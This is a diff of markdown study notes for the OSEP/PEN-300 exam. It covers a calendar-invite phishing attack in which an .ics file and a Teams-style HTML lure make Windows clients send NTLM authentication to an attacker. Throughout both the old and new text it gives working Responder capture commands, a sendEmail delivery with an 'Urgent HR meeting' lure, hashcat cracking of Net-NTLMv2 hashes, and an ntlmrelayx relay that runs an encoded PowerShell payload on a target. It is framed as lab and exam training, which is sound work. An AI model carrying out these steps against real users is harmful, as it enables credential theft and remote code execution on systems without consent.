@@ -2,76 +2,34 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 16 · ICS calendar invite triggers authentication (scenario 13)
+# ICS calendar invite
 
-> One-liner: you know the recipient address, the target will process meeting invites, but there is no macro execution path → send an `.ics` invite that **references external resources**, so the calendar client fetches them on parse/render/reminder and authenticates; capture hashes with Responder on the attacker box, or relay with ntlmrelayx to another SMB target.
->
-> **Course mapping:** Chapter 5 (§5.1 Calendar as an Initial Access Vector / iCalendar RFC 5545, §5.2.1–5.2.2 crafting and automating the invite, §5.2.3 Credential Stealing with Responder). Relaying the captured authentication is covered in Chapter 20 §20.1.4 and Chapter 22 §22.2.2.
->
-> **Core idea: whether auth fires depends on the calendar client version and config — “invite received / accepted” ≠ “auth will fire”. Require protocol-log evidence before moving on.**
+If the target will process a meeting invite but there is no macro path, send an `.ics` plus an HTML lure that makes the client authenticate to you. Invite received or accepted is not proof of auth — require a protocol log before you move on.
 
----
+Course mapping: PEN-300 Chapter 5 (calendar as an initial-access vector, crafting/automating the invite, credential stealing with Responder). Relaying a captured authentication is covered in Chapter 20 §20.1.4 and Chapter 22 §22.2.2.
 
-## Scenario 13: ICS calendar invite triggers authentication
+## Invite accepted, no macro path
 
-## 1. Situation
+If you know the recipient address and the client will open or accept a calendar invite, the course path is a Teams-style HTML mail with a “Click here to join the meeting” link at `http://LHOST`. When the user clicks, Responder’s HTTP server presents a fake login prompt and logs an HTTP Net-NTLMv2 hash. Crack it with hashcat `-m 5600`. Do not treat an HTTP fetch as “not auth” — the course capture is HTTP NTLMv2.
 
-> From `scenarios.md` (scenario 13): the target accepts calendar invites, but there is no macro execution opportunity. You know the recipient address; the target will process meeting invites. In the lab, the calendar client **may** fetch external resources referenced by the invite and authenticate.
->
-> Prepare ahead: the course ICS invite file, plus notes for auth capture and follow-on handling.
+A UNC path in `LOCATION` / `DESCRIPTION` is a useful second ref (the template already has one) and may trigger SMB auth without a click, but whether that fires depends on the client version and config. Put both kinds of ref in the same invite and let the logs show which one the client touched.
 
-One-liner exam point: an `.ics` invite is a carrier that makes the client **call back** to you; put a UNC path or URL in `LOCATION` / `DESCRIPTION` / `URL` / `ATTACH`. When the client handles the invite it may open SMB (`\\LHOST\...`) or HTTP(S). Whether auth succeeds and which protocol is used is entirely client behavior — **do not assume**.
+- [ ] Start Responder on the attacker interface (and optionally an HTTP token probe on a free port)
+- [ ] Generate a per-delivery invite from `m16-ics-invite.ics` (unique `TOKEN`)
+- [ ] Send the HTML lure + `.ics` attachment (inline `text/calendar` if the attachment is ignored)
+- [ ] Watch for `[HTTP] NTLMv2` or `[SMB] NTLMv2-SSP` from the target IP
+- [ ] Crack Net-NTLMv2, or relay only if you have SMB auth and signing is off
 
----
-
-## 2. Assumptions
-
-| Assumption | Notes | If false |
-|---|---|---|
-| Known target mailbox | Scenario gives `USER@DOMAIN` | Cannot deliver; change entry |
-| Target opens/accepts calendar invites | Client at least parses invite content | See failure branch 1 |
-| Client resolves external refs | Outlook / OWA / Thunderbird / Apple Calendar differ on LOCATION/URL/attachments | See failure branches 2, 3 |
-| Target can reach attacker | Auth = target initiates to `LHOST`; egress must be open | Find a reachable callback path first |
-| Target identity has lateral value | Domain user; hash crackable/relayable | Crack-only value is limited; see §8 |
-| Client runs on Windows | SMB refs can trigger NTLM (NTLMv2) auth | Non-Windows clients usually only hit HTTP — no auth hash |
-
-Lab defaults: attacker = Kali; target = Windows + AD (domain user); Outlook/OWA-class client handles the invite.
-
----
-
-## 3. Why the client fetches external resources
-
-An `.ics` (iCalendar, RFC 5545) `VEVENT` can include fields the client may actively fetch:
-
-- `LOCATION`: UNC `\\LHOST\share\...`. Some clients resolve network locations when rendering invites/reminders; if the user opens “Location”, Explorer walks SMB → auth.
-- `DESCRIPTION`: `https://URL/...` or UNC; HTML-capable clients that auto-load external content issue HTTP.
-- `URL`: invite’s own link; click or reading-pane preview may fetch it.
-- `ATTACH;FMTTYPE=...`: external attachment; “download attachment preview” fetches it.
-
-**Real trigger behavior is highly variable**: Outlook defaults to blocking automatic download of images/external content; versions differ on whether UNC in LOCATION is resolved or probed over SMB. Do not bet on one field — put **multiple refs in the same invite** (SMB + HTTPS token) and let logs show which one the client touched.
-
-> Design rule: SMB refs are the primary path to auth hashes; HTTP(S) refs only **prove** the client fetches external content (validate the trigger chain). Use both as probes.
-
----
-
-## 4. Prepare (attacker)
-
-Infra (dirs, port conventions) is in [00-environment-and-infra](/modules/00-environment-and-infra); here only scenario-13 specifics.
+Prepare a unique token and confirm tools:
 
 ```bash
 mkdir -p ~/osep/{logs,payloads/infra,loot}
-
-# Tool presence check
 which responder impacket-ntlmrelayx hashcat
-
-# Unique token: distinguish which victim / which delivery
 TOKEN="m16-$(date +%s | tail -c 6)"      # e.g. m16-3f2a91
-echo "$TOKEN"                            # note it; later filter logs and embed in ICS
+echo "$TOKEN"
 ```
 
-### 4.1 Generate the invite (replace placeholders)
-
-Template `m16-ics-invite.ics` uses placeholders `LHOST` `URL` `USER` `DOMAIN`. Before sending, sed-replace once and generate a **per-delivery unique token path**:
+Generate the invite (replace placeholders once):
 
 ```bash
 cd ~/osep/payloads/infra
@@ -85,33 +43,52 @@ sed -e "/^#/d" \
 head -20 invite-${TOKEN}.ics      # confirm replacements before send
 ```
 
-> Spec-wise `.ics` wants CRLF and long-line folding; most clients (including Outlook) tolerate LF. If the target client fails to parse, convert line endings then resend: `sed -i 's/$/\r/' invite-${TOKEN}.ics`.
+Spec-wise `.ics` wants CRLF and long-line folding; most clients (including Outlook) tolerate LF. If the target client fails to parse, convert line endings then resend: `sed -i 's/$/\r/' invite-${TOKEN}.ics`.
 
-### 4.2 Prepare capture (pick one mode, or sequence them)
-
-Capture (hashes) and relay (hit another host) **cannot run together** — ntlmrelayx and Responder both bind 445 (and related ports). Suggested flow: capture first to confirm trigger; after confirming SMB signing is off, switch to relay. One-shot script: `m16-auth-capture.sh`. Manual equivalents:
+Start Responder (course default — HTTP server is on; binds the interface, including 80/445):
 
 ```bash
-# Mode A: Responder capture (default on a chosen iface; WPAD optional to reduce noise)
-sudo responder -I eth0 -wv 2>&1 | tee -a ~/osep/logs/responder.log
-#   -I iface; -w start WPAD proxy (optional in exam); -v verbose
-
-# Mode B: ntlmrelayx to a chosen SMB target (confirm SMB signing not required)
-sudo impacket-ntlmrelayx --no-http-server -smb2support \
-  -t smb://TARGET \
-  -c "powershell -enc BASE64PAYLOAD" -of ~/osep/loot/relay-hashes.txt
+sudo responder -I tun0 2>&1 | tee -a ~/osep/logs/responder.log
+# or, with WPAD and verbose: sudo responder -I eth0 -wv
+# one-shot wrapper: bash m16-auth-capture.sh capture IFACE
 ```
 
-SMB signing check (required before relay):
+Deliver with `sendEmail` (HTML body + `.ics` attachment), as in the course:
+
+```bash
+sendEmail -s SMTP_SERVER -t USER@DOMAIN -f attacker@DOMAIN \
+  -u "Urgent HR meeting" \
+  -o message-content-type=html -o message-file=./email.html \
+  -a invite-${TOKEN}.ics
+```
+
+The HTML lure should look like a Teams invite; the key element is a clickable `{EVENT_URL}` (`http://LHOST`) labelled “Click here to join the meeting.” If the client ignores the attachment, resend with an inline `Content-Type: text/calendar; method=REQUEST` block, or send both.
+
+A log line like `[HTTP] NTLMv2 Username : DOMAIN\user` plus a Hash blob, sourced from the target IP, is auth. The same is true for `[SMB] NTLMv2-SSP`. Save the hash blob and crack it:
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Net-NTLMv2 is challenge-response — crack or relay only, do not attempt PTH. If crack fails and the capture was SMB, switch to relay against a target where SMB signing is not required:
 
 ```bash
 nmap -p 445 --script smb2-security-mode TARGET
 # relay only when smb2-security-mode reports "Message signing enabled but not required"
+# capture and relay cannot share 445 — stop Responder first
+sudo impacket-ntlmrelayx --no-http-server -smb2support \
+  -t smb://TARGET \
+  -c "powershell -enc BASE64PAYLOAD" -of ~/osep/loot/relay-hashes.txt
+# or: bash m16-auth-capture.sh relay TARGET CMD
 ```
 
----
+`crackmapexec smb <range> --gen-relay-list` can batch-find relay candidates. Hash follow-on: [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).
 
-#### `m16-ics-invite.ics`
+If there is only an SMTP delivery receipt and no callback, the mail never opened, the link was not clicked, or `LHOST` is not reachable from the target — confirm the receiver (`ss -ltnp | grep -E '445|80'`), then try inline `text/calendar` or a UNC in `LOCATION`. If you get an HTTP token-path request but no hash, the client fetched content without sending credentials — keep watching for a click, or lean on the SMB refs already in the template. If hashes arrive from an unrelated source IP or account, filter the log for the target IP and the unique `TOKEN`. If relay fails (`no more targets`, signing required, or port conflict), fall back to capture + crack.
+
+Responder is a poisoner: by default it answers LLMNR/NBT-NS/WPAD. Start it only when you need auth, only on the target’s interface, and stop it immediately after use. Trigger timing is uncertain — cap observation at about 20–30 minutes and keep other scoring paths moving in parallel. Archive logs under `~/osep/logs/` and hashes under `~/osep/loot/`.
+
+::: details `m16-ics-invite.ics` · click to expand
 
 ````text
 # ---- header (NOT part of the iCalendar spec) --------------------------------
@@ -151,7 +128,9 @@ END:VEVENT
 END:VCALENDAR
 ````
 
-#### `m16-auth-capture.sh`
+:::
+
+::: details `m16-auth-capture.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -234,93 +213,14 @@ case "$MODE" in
 esac
 ````
 
-## 5. Procedure
+:::
 
-1. **Start the receiver**: `bash m16-auth-capture.sh` (or §4.2 manual commands). Confirm listen ports and log paths.
-2. **Start HTTP token probe** (optional but recommended): `python3 -m http.server 80 --directory ~/osep/payloads` and watch the log — only a request to the token path proves the client fetches external content.
-3. **Generate invite**: §4.1 replace placeholders → `invite-${TOKEN}.ics`.
-4. **Deliver** (try both; attachment first, then inline):
-   - Attachment: mail with `invite-${TOKEN}.ics`, short body: “Please open and accept the meeting invite in the attachment.”
-   - Inline: HTML mail with a `Content-Type: text/calendar; method=REQUEST` calendar block (some clients only handle inline invites, not attachments).
-5. **Observe** (critical — do not rush tool switches): Responder / ntlmrelayx log for `[SMB] NTLMv2-SSP` from the target IP; HTTP log for the token path. Note time and source IP.
-6. **Handle hashes**: auth appeared → stop sending, go to §8; HTTP fetch only → client fetches content but not SMB; tune via failure branches 2/3.
-7. **Cleanup**: stop Responder/relay; archive logs under `~/osep/logs/`; store hashes under `~/osep/loot/`.
+## Cheat sheet
 
----
-
-## 6. Scripts used
-
-| File | Role | When |
-|---|---|---|
-| `m16-ics-invite.ics` | Invite template (LOCATION=UNC, URL/ATTACH=https token, DESCRIPTION dual refs) | After placeholder replace, as mail attachment/inline |
-| `m16-auth-capture.sh` | Responder capture / ntlmrelayx relay one-shot (port checks, logs, hashcat hints) | Start on attacker before each delivery |
-
-Related: PEN-300 (`pen-300.pdf`) Chapter 5 §5.2.3 *Credential Stealing with Responder*; NTLM relay in Chapter 20 §20.1.4 and Chapter 22 §22.2.2. Hash follow-on: [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).
-
----
-
-## 7. Validation (invite received ≠ auth)
-
-**The only trustworthy “authenticated” evidence is auth-protocol logs** — not “delivery succeeded” or “they fetched HTTP content”.
-
-| Observation | Conclusion |
+| You want to… | Use |
 |---|---|
-| Responder shows `[SMB] NTLMv2-SSP Username : DOMAIN\user` + `Hash`, source = target IP | ✅ Auth confirmed → §8 |
-| ntlmrelayx shows `Authenticating against smb://TARGET ... SUCCEED` + `Executed specified command` | ✅ Relay confirmed (session on TARGET) |
-| HTTP log shows token-path request | ⚠️ Client fetches external content — **not** auth; keep watching / swap SMB refs |
-| Only SMTP delivery receipt, no callback | ❌ Not triggered → failure branches |
-| Auth from unrelated account/source | ⚠️ Filter or redeliver; see failure branch 4 |
-
-Observation cadence: leave a **generous watch window** after delivery (open/reminder timing is unpredictable); prepare other entries in parallel — do not idle-wait.
-
----
-
-## 8. What to do with captured hashes (decision tree)
-
-```
-Got auth
-├─ Protocol SMB and Hash line is NTLMv2-SSP → Net-NTLMv2
-│   ├─ Crack: hashcat -m 5600 hash.txt rockyou.txt
-│   │    success → plaintext PASS → normal lateral / WinRM / domain use
-│   │    fail → cannot PTH (Net-NTLMv2 is challenge-response, not NTLM hash)
-│   └─ Relay: switch ntlmrelayx to an SMB-signing-off target (§4.2 mode B)
-├─ Got NTLM (local SAM-style cases) → PTH directly
-└─ Only HTTP fetch (no auth) → no hash from this scenario; change entry/client behavior
-```
-
-Key points:
-- Net-NTLMv2 (hashcat `-m 5600`) is crack or relay only; **do not attempt PTH**.
-- Relay target: same domain, SMB signing not required; `crackmapexec smb <range> --gen-relay-list` can batch-find candidates.
-- Wordlists/rules and PTH usage: [07-credentials-lsass](/modules/07-credentials-lsass).
-
----
-
-## 9. Failure branches and alternatives
-
-1. **Client ignores attachment `.ics`** (treats as unknown file): switch to inline `text/calendar`; or send both (attachment + inline). Still no → client may not process calendar invites; change delivery channel (web calendar link, embedded invite) or abandon this entry.
-2. **Client treats LOCATION as plain text** (renders but does not resolve UNC): put `https://URL/...` in `URL` and watch for preview fetch; or put a clickable link in `DESCRIPTION` with a short prompt — user click on URL/UNC still triggers SMB/HTTP auth (source is still the target user).
-3. **HTTP fetch but no SMB auth**: auto-download of external content disabled, or client prefers HTTP. Keep SMB + HTTPS refs together (template already does); confirm SMB ref was not stripped as plain text; else accept “reachability only” and try ATTACH external-file preview.
-4. **Unrelated hashes** (wrong source IP/username): filter `responder.log` for the target IP; put the token only in the invite sent to the target; ignore other requests.
-5. **Relay fails** (signing required / port conflict / target unreachable): fall back to capture + crack; or change relay target; `no more targets` from ntlmrelayx is usually signing/permissions — recheck §4.2.
-6. **Long silence, no callback**: confirm receiver is up (`ss -ltnp | grep -E '445|80'`), `LHOST` is **reachable from the target** (not a NAT-internal IP), and the invite was actually sent. All green → this client config does not fetch external content (expected); change entry and record per §10.
-
----
-
-## 10. Exam / OPSEC notes
-
-- **Responder is a poisoner**: by default it answers LLMNR/NBT-NS/WPAD. In the exam, start it only when you need auth, only on the target’s iface, note why it is running, and stop immediately after use.
-- **Sending mail leaves artifacts**: deliver only to the intended account; use plausible business wording; do not put attack intent in the body.
-- **Log discipline**: Responder/relay/HTTP logs all go under `~/osep/logs/`, hashes under `~/osep/loot/` — the report must reconstruct time / request / result.
-- **Time budget**: trigger is uncertain — a low-odds entry. **Prepare/finish other stable scoring paths in parallel**; cap this scenario at ~20–30 minutes of observation, then move on.
-- **Do not assume success**: keep “invite received ≠ auth” in your notes; describe the validation process honestly in the report.
-
----
-
-## 11. Related docs
-
-| Doc | Link |
-|---|---|
-| [00-environment-and-infra](/modules/00-environment-and-infra) | Delivery/listen infra, log dir conventions |
-| [07-credentials-lsass](/modules/07-credentials-lsass) | Crack / PTH after you have a hash |
-| [12-ad-attacks](/modules/12-ad-attacks) | Lateral use of hashes/tickets; relay target selection |
-| [01-word-vba-office](/modules/01-word-vba-office) | Same mail/client entry family (macro path — excluded here) |
+| Course path (click → HTTP NTLMv2) | Teams-style HTML lure + `sendEmail -a invite.ics`; `sudo responder -I tun0` |
+| Build the invite | `m16-ics-invite.ics` (sed-replace `LHOST` / `URL` / `USER` / `DOMAIN` / `TOKEN`) |
+| One-shot receiver | `bash m16-auth-capture.sh capture IFACE` / `relay TARGET CMD` / `probe` |
+| Crack Net-NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` (no PTH) |
+| Relay (SMB auth only, signing off) | Stop Responder, then `impacket-ntlmrelayx -t smb://TARGET` |
